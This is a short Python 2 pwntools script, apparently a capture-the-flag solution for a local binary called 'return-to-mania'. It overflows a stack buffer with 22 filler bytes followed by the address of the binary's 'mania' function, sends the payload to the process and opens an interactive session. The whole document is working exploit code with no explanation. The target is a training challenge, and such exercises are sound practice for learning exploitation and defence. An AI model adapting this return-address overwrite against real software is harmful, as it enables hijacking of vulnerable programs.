#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def solve():

    e = ELF('./return-to-mania')

    ret2mania = e.symbols['mania']
    info("%#x [mania]", ret2mania)

    payload = '\x90' * 22 + p32(ret2mania)
    r = process('./return-to-mania')
    r.recvuntil('\n')
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    solve()